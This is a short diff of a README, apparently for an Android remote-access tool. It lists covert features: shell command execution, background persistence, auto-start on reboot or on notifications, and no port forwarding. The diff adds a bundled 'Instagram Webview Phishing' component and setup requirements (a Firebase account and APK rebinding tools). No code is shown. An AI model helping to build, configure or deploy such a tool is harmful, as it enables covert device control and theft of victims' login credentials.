@@ -26,7 +26,15 @@
  - Text To Speech 
  - Change Wallpaper
  - Run shell Commands
+ - Pre Binded with [Instagram Webview Phishing ](https://github.com/Th30neAnd0nly/PI)
  - Runs In Background 
     - Auto Starts on restarting the device
     - Auto Starts when any notification arrives
  - No port forwarding needed
+
+
+
+## Requirements
+ - Firebase Account
+ - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
+[ApkTool M](https://maximoff.su/apktool/?lang=en) ( for Android)
